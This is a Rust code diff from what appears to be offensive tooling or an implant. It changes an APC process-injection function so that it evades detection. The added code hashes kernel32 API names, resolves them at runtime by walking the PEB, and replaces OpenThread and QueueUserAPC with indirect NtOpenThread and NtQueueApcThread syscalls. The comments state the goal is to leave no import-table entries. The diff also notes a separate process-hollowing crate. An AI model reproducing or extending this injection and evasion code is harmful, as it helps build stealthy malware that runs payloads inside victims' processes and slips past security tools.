@@ -19,6 +19,36 @@ use anyhow::Result;
 use serde::{Deserialize, Serialize};
 use sysinfo::System;
 
+// ── pe_resolve helpers (Windows only) ───────────────────────────────────────
+#[cfg(windows)]
+use crate::pe_resolve_macros::hash_str_const;
+
+/// Resolve a function pointer from kernel32 via PEB walking (no IAT).
+#[cfg(windows)]
+unsafe fn pm_resolve_api<T>(fn_hash: u32) -> anyhow::Result<T> {
+    let module = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
+        .ok_or_else(|| anyhow::anyhow!("kernel32 not found in PEB"))?;
+    let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)
+        .ok_or_else(|| anyhow::anyhow!("API not found (hash 0x{:08X})", fn_hash))?;
+    Ok(std::mem::transmute_copy(&addr))
+}
+
+// ── kernel32 API hash constants ──────────────────────────────────────────────
+#[cfg(windows)]
+const HASH_CREATETOOLHELP32SNAPSHOT: u32 = hash_str_const(b"CreateToolhelp32Snapshot\0");
+#[cfg(windows)]
+const HASH_THREAD32FIRST: u32 = hash_str_const(b"Thread32First\0");
+#[cfg(windows)]
+const HASH_THREAD32NEXT: u32 = hash_str_const(b"Thread32Next\0");
+
+// ── Function pointer types (kernel32) ────────────────────────────────────────
+#[cfg(windows)]
+type FnCreateToolhelp32Snapshot = unsafe extern "system" fn(u32, u32) -> *mut std::ffi::c_void;
+#[cfg(windows)]
+type FnThread32First = unsafe extern "system" fn(*mut std::ffi::c_void, *mut winapi::um::tlhelp32::THREADENTRY32) -> i32;
+#[cfg(windows)]
+type FnThread32Next = unsafe extern "system" fn(*mut std::ffi::c_void, *mut winapi::um::tlhelp32::THREADENTRY32) -> i32;
+
 // Windows-only process hollowing now lives in the shared `hollowing` crate.
 
 /// A lightweight, serializable view over a process suitable for shipping back
@@ -1364,9 +1394,8 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
     //     that thread next enters an alertable wait state).
     // The original implementation incorrectly spawned a *new* svchost.exe
     // instead of injecting into the supplied `pid`.
-    use winapi::um::processthreadsapi::{OpenThread, QueueUserAPC};
     use winapi::um::tlhelp32::{
-        CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
+        TH32CS_SNAPTHREAD, THREADENTRY32,
     };
     use winapi::um::winnt::{
         MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_VM_OPERATION,
@@ -1459,7 +1488,15 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
         let _ = syscall!("NtClose", hprocess as u64);
 
         // Snapshot all threads in the system, filter by owner pid, queue APC.
-        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+        // Resolve kernel32 functions at runtime to avoid IAT entries.
+        let create_snapshot: FnCreateToolhelp32Snapshot =
+            pm_resolve_api(HASH_CREATETOOLHELP32SNAPSHOT)?;
+        let thread32_first: FnThread32First =
+            pm_resolve_api(HASH_THREAD32FIRST)?;
+        let thread32_next: FnThread32Next =
+            pm_resolve_api(HASH_THREAD32NEXT)?;
+
+        let snapshot = create_snapshot(TH32CS_SNAPTHREAD, 0);
         if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
             return Err(anyhow::anyhow!(
                 "apc_inject: CreateToolhelp32Snapshot failed"
@@ -1471,18 +1508,43 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
         entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
 
         let mut queued = 0u32;
-        if Thread32First(snapshot, &mut entry) != 0 {
+        if thread32_first(snapshot, &mut entry) != 0 {
             loop {
                 if entry.th32OwnerProcessID == pid {
-                    let hthread = OpenThread(THREAD_SET_CONTEXT, 0, entry.th32ThreadID);
-                    if !hthread.is_null() {
-                        if QueueUserAPC(apc_routine, hthread, 0) != 0 {
+                    // NtOpenThread (indirect syscall, no IAT entry).
+                    let mut obj_attr_thread: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
+                    obj_attr_thread.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+                    let mut cid_thread: u64 = entry.th32ThreadID as u64;
+                    let mut hthread: usize = 0;
+                    let nt_open = syscall!(
+                        "NtOpenThread",
+                        &mut hthread as *mut _ as u64,
+                        THREAD_SET_CONTEXT as u64,
+                        &mut obj_attr_thread as *mut _ as u64,
+                        &mut cid_thread as *mut _ as u64,
+                    );
+                    if nt_open.is_ok() && nt_open.unwrap() >= 0 && hthread != 0 {
+                        // P2-31: Wrap the thread handle in NtHandle so it is
+                        // automatically closed via NtClose even if an early
+                        // return or panic is added to this block later.
+                        let _thread_guard = crate::nt_handle::NtHandle::new(hthread);
+
+                        // NtQueueApcThread (indirect syscall, no IAT entry).
+                        let nt_apc = syscall!(
+                            "NtQueueApcThread",
+                            _thread_guard.raw() as u64,
+                            apc_routine as u64,
+                            0u64,
+                            0u64,
+                            0u64,
+                        );
+                        if nt_apc.is_ok() && nt_apc.unwrap() >= 0 {
                             queued += 1;
                         }
-                        pe_resolve::close_handle(hthread);
+                        // _thread_guard dropped here → NtClose via indirect syscall.
                     }
                 }
-                if Thread32Next(snapshot, &mut entry) == 0 {
+                if thread32_next(snapshot, &mut entry) == 0 {
                     break;
                 }
             }
